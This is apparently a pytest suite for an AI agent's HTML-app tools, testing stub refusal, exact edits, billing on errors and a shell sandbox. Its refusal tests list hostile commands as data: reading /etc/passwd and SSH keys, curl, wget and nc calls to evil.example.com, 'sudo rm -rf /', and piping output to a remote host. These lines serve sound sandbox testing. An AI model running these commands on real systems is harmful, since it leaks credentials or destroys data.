"""Round 12 — the five single-file-HTML app tools.

These pin the properties that make the pipeline safe to hand a model:

  1. `create_app_file` refuses a stub. The 952-byte `x.pdf` (2026-08-18) was
     a prompt-mandated tool called with nothing, producing a real, persisted,
     BILLED artifact. Same class of tool, same refusal.
  2. `edit_app_file` fails loudly on BOTH ways an exact-string edit goes
     wrong — absent, and ambiguous — and writes nothing either way.
  3. `bash_app` refuses to leave the app directory and refuses every binary
     that could exfiltrate or install.
  4. Every failure returns a string starting with `ERROR:`, because that
     prefix is what `ToolExecutor._meter_flat_tool` keys on to NOT bill a
     failed call.
  5. The store's path jail holds for slugs, state files and versions.

Anti-vacuity: `test_refusals_are_not_vacuous` proves the bash jail can say
yes, so the refusal tests are not just "everything is refused".
"""

from __future__ import annotations

import asyncio
import json
import os

import pytest

from app.agent.skills.base import SkillContext
from app.agent.skills.builtins.app_html import shell, steps as steps_mod, store
from app.agent.skills.builtins.app_html.skill import AppHtmlSkill
from app.agent.skills.builtins.app_html.store import AppStoreError


# ── Fixtures ─────────────────────────────────────────────────────────

@pytest.fixture()
def apps_dir(tmp_path, monkeypatch):
    root = tmp_path / "apps"
    monkeypatch.setenv("TOUP_HTML_APPS_DIR", str(root))
    monkeypatch.setenv("HOME", str(tmp_path / "home"))
    (tmp_path / "home").mkdir()
    store.ensure_root()
    return root


@pytest.fixture()
def skill(apps_dir, monkeypatch):
    s = AppHtmlSkill()
    # The tools are unit-under-test; the job/DB/WS side is exercised
    # separately and must never be the reason a filesystem assertion fails.
    async def _noop(*_a, **_k):
        return None

    async def _job(*_a, **_k):
        return "job-test"

    monkeypatch.setattr(steps_mod, "ensure_job", _job)
    monkeypatch.setattr(steps_mod, "emit_step", _noop)
    monkeypatch.setattr(steps_mod, "finish_job", _noop)
    monkeypatch.setattr(steps_mod, "announce_ready", _noop)

    async def _upsert(**kwargs):
        return "app-test"

    monkeypatch.setattr(steps_mod, "upsert_app_row", _upsert)
    return s


CTX = SkillContext(workspace="/tmp", user_id="user-1", session_id="s1")


def run(coro):
    return asyncio.get_event_loop().run_until_complete(coro)


def call(skill, name, **args):
    return run(skill.execute_tool(f"app_html__{name}", args, CTX))


def good_html(title="Budget Tracker", extra=""):
    return (
        "<!doctype html>\n<html lang=\"en\">\n<head>\n"
        "<meta charset=\"utf-8\">\n"
        "<meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">\n"
        f"<title>{title}</title>\n"
        "<style>\n"
        ":root{--bg:#0B0B0F;--ink:#F4F4F5;--accent:#FF5C39;}\n"
        "body{margin:0;background:var(--bg);color:var(--ink);"
        "font:16px/1.5 system-ui,sans-serif}\n"
        ".btn{background:var(--accent);color:#fff;border:0;padding:12px 24px;"
        "border-radius:12px;cursor:pointer}\n"
        ".btn:hover{filter:brightness(1.08)}\n"
        ".btn:focus-visible{outline:3px solid var(--ink);outline-offset:2px}\n"
        "@media (min-width:768px){.grid{grid-template-columns:repeat(2,1fr)}}\n"
        "</style>\n</head>\n<body>\n"
        "<main class=\"wrap\">\n"
        "<h1>Monthly spend</h1>\n"
        "<ul id=\"rows\"><li>Rent · 1,850.00 · Sep 1</li></ul>\n"
        "<button class=\"btn\" id=\"add\">Add expense</button>\n"
        f"{extra}"
        "</main>\n"
        "<script>\n"
        "document.getElementById('add').addEventListener('click', () => {\n"
        "  const li = document.createElement('li');\n"
        "  li.textContent = 'Groceries · 42.10 · today';\n"
        "  document.getElementById('rows').appendChild(li);\n"
        "});\n"
        "</script>\n</body>\n</html>\n"
    )


# ── 1. create_app_file ───────────────────────────────────────────────

def test_create_writes_one_html_file_and_a_manifest(skill, apps_dir):
    out = call(skill, "create_app_file", slug="budget-tracker",
               title="Budget Tracker", html=good_html())
    assert not out.startswith("ERROR:"), out

    path = apps_dir / "budget-tracker.html"
    assert path.is_file()
    assert path.read_text().startswith("<!doctype html>")

    manifest = json.loads((apps_dir / "manifest.json").read_text())
    rec = manifest["apps"]["budget-tracker"]
    assert rec["title"] == "Budget Tracker"
    assert rec["revision"] == 1
    assert rec["size_bytes"] == path.stat().st_size

    # The whole point of the migration: an app is ONE file. Nothing else
    # (no node_modules, no package.json, no lockfile) is created.
    entries = {p.name for p in apps_dir.iterdir()}
    assert entries <= {"budget-tracker.html", "manifest.json", ".versions",
                       "toup-frontend-design.md"}, entries


@pytest.mark.parametrize("html,needle", [
    ("", "empty"),
    ("<!doctype html><html><body>x</body></html>", "stub"),
    ("just some text that is long enough " * 40, "does not look like a document"),
    ("<!doctype html><html><head></head></html>" + "<!--pad-->" * 100, "no <body>"),
])
def test_create_refuses_stubs_and_non_documents(skill, html, needle):
    out = call(skill, "create_app_file", slug="stub", title="Stub", html=html)
    assert out.startswith("ERROR:"), out
    assert needle in out


def test_create_refuses_a_script_from_a_non_cdnjs_origin(skill):
    """The CSP blocks it, so the page would render blank and the model would
    report success. Fail at write time instead."""
    html = good_html(extra='<script src="https://evil.example.com/x.js"></script>')
    out = call(skill, "create_app_file", slug="x-app", title="X", html=html)
    assert out.startswith("ERROR:")
    assert "evil.example.com" in out
    assert "cdnjs.cloudflare.com" in out


def test_create_allows_cdnjs(skill, apps_dir):
    html = good_html(
        extra='<script src="https://cdnjs.cloudflare.com/ajax/libs/react/18.2.0/umd/react.production.min.js"></script>'
    )
    out = call(skill, "create_app_file", slug="react-app", title="React App", html=html)
    assert not out.startswith("ERROR:"), out
    assert (apps_dir / "react-app.html").is_file()


@pytest.mark.parametrize("slug", [
    "", "Budget Tracker", "budget_tracker", "-budget", "budget-",
    "../etc/passwd", "a/b", "manifest", "index", "x" * 61,
])
def test_create_rejects_bad_slugs(skill, slug, apps_dir):
    out = call(skill, "create_app_file", slug=slug, title="T", html=good_html())
    assert out.startswith("ERROR:"), (slug, out)
    # Nothing escaped, nothing landed.
    assert not (apps_dir.parent / "passwd").exists()
    assert list(apps_dir.glob("*.html")) == []


def test_recreate_bumps_revision_and_keeps_the_previous_version(skill, apps_dir):
    call(skill, "create_app_file", slug="app-one", title="One", html=good_html())
    call(skill, "create_app_file", slug="app-one", title="One",
         html=good_html(extra="<p>v2</p>"))
    rec = store.read_manifest()["app-one"]
    assert rec.revision == 2
    assert store.list_versions("app-one"), "the pre-edit revision was not kept"
    assert "v2" in (apps_dir / "app-one.html").read_text()


# ── 2. view_app_file ─────────────────────────────────────────────────

def test_view_returns_bytes_identical_content(skill, apps_dir):
    html = good_html()
    call(skill, "create_app_file", slug="viewme", title="View", html=html)
    out = call(skill, "view_app_file", slug="viewme")
    # Byte-identical, with NO line-number gutter: edit_app_file matches
    # exactly, and a gutter is exactly what ends up pasted into old_string.
    assert out == html
    assert not out.startswith("     1\t")


def test_view_of_a_missing_app_names_what_exists(skill):
    call(skill, "create_app_file", slug="real-app", title="Real", html=good_html())
    out = call(skill, "view_app_file", slug="ghost")
    assert out.startswith("ERROR:")
    assert "real-app" in out


# ── 3. edit_app_file ─────────────────────────────────────────────────

def test_edit_replaces_exactly_once(skill, apps_dir):
    call(skill, "create_app_file", slug="edit-me", title="Edit", html=good_html())
    out = call(skill, "edit_app_file", slug="edit-me",
               old_string="<h1>Monthly spend</h1>",
               new_string="<h1>September spend</h1>",
               reason="clarify the heading")
    assert not out.startswith("ERROR:"), out
    text = (apps_dir / "edit-me.html").read_text()
    assert "September spend" in text
    assert "Monthly spend" not in text
    assert store.read_manifest()["edit-me"].revision == 2


def test_edit_fails_when_old_string_is_absent_and_writes_nothing(skill, apps_dir):
    call(skill, "create_app_file", slug="edit-me", title="Edit", html=good_html())
    before = (apps_dir / "edit-me.html").read_text()
    out = call(skill, "edit_app_file", slug="edit-me",
               old_string="<h1>Nope</h1>", new_string="<h1>Yes</h1>")
    assert out.startswith("ERROR:")
    assert "not found" in out
    assert (apps_dir / "edit-me.html").read_text() == before
    assert store.read_manifest()["edit-me"].revision == 1


def test_edit_fails_when_old_string_is_ambiguous_and_writes_nothing(skill, apps_dir):
    html = good_html(extra="<p class=\"note\">x</p><p class=\"note\">x</p>")
    call(skill, "create_app_file", slug="edit-me", title="Edit", html=html)
    before = (apps_dir / "edit-me.html").read_text()
    out = call(skill, "edit_app_file", slug="edit-me",
               old_string='<p class="note">x</p>', new_string="<p>y</p>")
    assert out.startswith("ERROR:")
    assert "2 times" in out
    assert (apps_dir / "edit-me.html").read_text() == before


def test_edit_rejects_empty_and_identical_strings(skill):
    call(skill, "create_app_file", slug="edit-me", title="Edit", html=good_html())
    assert call(skill, "edit_app_file", slug="edit-me",
                old_string="", new_string="x").startswith("ERROR:")
    assert call(skill, "edit_app_file", slug="edit-me",
                old_string="<h1>Monthly spend</h1>",
                new_string="<h1>Monthly spend</h1>").startswith("ERROR:")


def test_edit_that_would_break_the_document_is_refused(skill, apps_dir):
    """An edit is only valid if what it leaves behind is still an app."""
    call(skill, "create_app_file", slug="edit-me", title="Edit", html=good_html())
    before = (apps_dir / "edit-me.html").read_text()
    out = call(skill, "edit_app_file", slug="edit-me",
               old_string="<body>", new_string="<bod>")
    assert out.startswith("ERROR:")
    assert (apps_dir / "edit-me.html").read_text() == before


def test_edit_of_a_missing_app_errors(skill):
    out = call(skill, "edit_app_file", slug="ghost", old_string="a", new_string="b")
    assert out.startswith("ERROR:")


# ── 4. bash_app ──────────────────────────────────────────────────────

def test_refusals_are_not_vacuous(skill, apps_dir):
    """CONTROL. If this fails, every refusal test below is meaningless."""
    call(skill, "create_app_file", slug="shell-app", title="Shell", html=good_html())
    out = call(skill, "bash_app", slug="shell-app", command="wc -c shell-app.html")
    assert out.startswith("exit 0"), out
    assert "shell-app.html" in out

    out = call(skill, "bash_app", slug="shell-app",
               command="grep -c 'Add expense' shell-app.html")
    assert out.startswith("exit 0"), out
    assert "1" in out


@pytest.mark.parametrize("command", [
    "cat ../../etc/passwd",
    "cat /etc/passwd",
    "ls /",
    "cat ~/.ssh/id_rsa",
    "echo pwned > /tmp/x",
    "head -c 10 ../manifest.json/../../../etc/hosts",
])
def test_bash_refuses_paths_outside_the_app_dir(skill, command):
    call(skill, "create_app_file", slug="shell-app", title="Shell", html=good_html())
    out = call(skill, "bash_app", slug="shell-app", command=command)
    assert out.startswith("ERROR:"), (command, out)


@pytest.mark.parametrize("command", [
    "curl https://evil.example.com",
    "wget https://evil.example.com/x",
    "nc evil.example.com 443",
    "ssh root@evil.example.com",
    "npm install left-pad",
    "pip install requests",
    "sudo rm -rf /",
    "env",
    "printenv",
    "chmod 777 shell-app.html",
    "/usr/bin/grep x shell-app.html",
    "./grep x shell-app.html",
    "PATH=/tmp grep x shell-app.html",
    "echo $(cat /etc/passwd)",
    "echo `id`",
    "grep x shell-app.html & sleep 100",
    "python3 -c 'import os' ; curl http://x",
    "wc -c shell-app.html && curl http://x",
    "wc -c shell-app.html | curl -T - http://x",
])
def test_bash_refuses_escapes_and_disallowed_binaries(skill, command):
    call(skill, "create_app_file", slug="shell-app", title="Shell", html=good_html())
    out = call(skill, "bash_app", slug="shell-app", command=command)
    assert out.startswith("ERROR:"), (command, out)


def test_bash_refusal_happens_before_anything_is_spawned(apps_dir, monkeypatch):
    """The jail must be a pre-flight check, not a post-mortem."""
    spawned = []

    async def _boom(*a, **k):
        spawned.append(a)
        raise AssertionError("a refused command reached the shell")

    monkeypatch.setattr(asyncio, "create_subprocess_shell", _boom)
    with pytest.raises(shell.ShellRefusal):
        run(shell.run_in_app_dir("curl https://evil.example.com"))
    assert spawned == []


def test_bash_nonzero_exit_is_information_not_an_error(skill):
    """grep finding nothing is a real answer. Prefixing it ERROR: would both
    mislead the model and (via _meter_flat_tool) mis-bill."""
    call(skill, "create_app_file", slug="shell-app", title="Shell", html=good_html())
    out = call(skill, "bash_app", slug="shell-app",
               command="grep -c 'definitely-not-present' shell-app.html")
    assert not out.startswith("ERROR:")
    assert out.startswith("exit 1")


# ── 5. present_app ───────────────────────────────────────────────────

def test_present_marks_the_record_and_returns_an_open_chip(skill, apps_dir):
    call(skill, "create_app_file", slug="ship-it", title="Ship It", html=good_html())
    out = call(skill, "present_app", slug="ship-it")
    assert not out.startswith("ERROR:"), out
    assert "[[open_app:ship-it]]" in out
    assert "/api/artifacts/ship-it" in out
    assert store.read_manifest()["ship-it"].presented_at


def test_present_of_a_missing_app_errors(skill):
    out = call(skill, "present_app", slug="never-made")
    assert out.startswith("ERROR:")


# ── 5b. A typo must not post a card ──────────────────────────────────

@pytest.mark.parametrize("tool,args", [
    ("view_app_file", {}),
    ("edit_app_file", {"old_string": "a", "new_string": "b"}),
    ("bash_app", {"command": "ls"}),
    ("present_app", {}),
])
def test_a_missing_app_never_opens_a_job(skill, monkeypatch, tool, args):
    """Every tool but `create` opens the app's job card before working.

    If they did that before checking the app exists, one mistyped slug would
    post a "Build: budget-trakcer" card into the user's chat that never
    resolves, because nothing is building.
    """
    opened = []

    async def _spy(user_id, slug, title):
        opened.append(slug)
        return "job-test"

    monkeypatch.setattr(steps_mod, "ensure_job", _spy)

    call(skill, "create_app_file", slug="real-app", title="Real", html=good_html())
    opened.clear()

    out = call(skill, tool, slug="budget-trakcer", **args)
    assert out.startswith("ERROR:"), out
    assert opened == [], f"{tool} opened a job for a nonexistent app"

    # Control — the same tool DOES open a job for an app that exists, so the
    # assertion above is about the guard and not about a broken spy.
    call(skill, tool, slug="real-app", **args)
    assert opened == ["real-app"]


# ── 6. Storage bridge persistence ────────────────────────────────────

def test_state_round_trips_and_merges(apps_dir):
    assert store.read_state("bud") == {}
    store.merge_state("bud", {"budget": 1850, "currency": "EUR"})
    assert store.read_state("bud") == {"budget": 1850, "currency": "EUR"}
    # Merge, not replace — two tabs must not clobber each other.
    store.merge_state("bud", {"currency": "USD"})
    assert store.read_state("bud") == {"budget": 1850, "currency": "USD"}
    # null deletes.
    store.merge_state("bud", {"budget": None})
    assert store.read_state("bud") == {"currency": "USD"}


def test_state_survives_a_reimport_of_the_module(apps_dir):
    """Persistence on DISK, not memoization in this process.

    A dict cached on the module would satisfy the round-trip test above and
    still lose everything on the next container boot, so the check that
    matters is: reload the module, read again, same value.
    """
    import importlib.util

    store.merge_state("bud", {"rows": [{"label": "Rent", "amount": 1850}]})
    on_disk = json.loads((apps_dir / ".state" / "bud.json").read_text())
    assert on_disk["rows"][0]["amount"] == 1850

    # A SEPARATE module object, not importlib.reload(): reload rebinds
    # `store` in sys.modules, which swaps out the AppStoreError class every
    # other test in this file has already captured — the suite then passes
    # alone and fails as a whole.
    import sys
    spec = importlib.util.spec_from_file_location("_cold_store", store.__file__)
    cold = importlib.util.module_from_spec(spec)
    # @dataclass resolves its own module out of sys.modules while executing,
    # so the entry has to exist during exec_module — then be removed again so
    # nothing else in the session can pick up the duplicate.
    sys.modules["_cold_store"] = cold
    try:
        spec.loader.exec_module(cold)
        assert cold.read_state("bud")["rows"][0]["label"] == "Rent"
    finally:
        sys.modules.pop("_cold_store", None)


def test_state_is_capped(apps_dir):
    with pytest.raises(AppStoreError):
        store.write_state("bud", {"blob": "x" * (store.MAX_STATE_BYTES + 1)})


@pytest.mark.parametrize("slug", ["../escape", "a/b", "..", ""])
def test_state_path_is_jailed(apps_dir, slug):
    with pytest.raises(AppStoreError):
        store.merge_state(slug, {"k": "v"})


# ── 7. Footprint — the reason the pipeline changed ───────────────────

def test_an_app_costs_kilobytes_not_hundreds_of_megabytes(skill, apps_dir):
    """Guards the migration's whole premise.

    Measured Expo baseline (2026-08-20, this repo's own dependency set):
    node_modules = 462,972 KiB across 27,133 files per app. The ceiling here
    is 1 MiB and 3 files, i.e. >400x smaller — if a future change
    reintroduces a per-app dependency tree, this fails.
    """
    for i in range(3):
        call(skill, "create_app_file", slug=f"app-{i}", title=f"App {i}",
             html=good_html(title=f"App {i}"))
        call(skill, "present_app", slug=f"app-{i}")

    total = 0
    files = 0
    for dirpath, _dirs, names in os.walk(apps_dir):
        for n in names:
            total += os.path.getsize(os.path.join(dirpath, n))
            files += 1
    assert files <= 12, files
    assert total < 1024 * 1024, total
    assert not any("node_modules" in d for d, _, _ in os.walk(apps_dir))
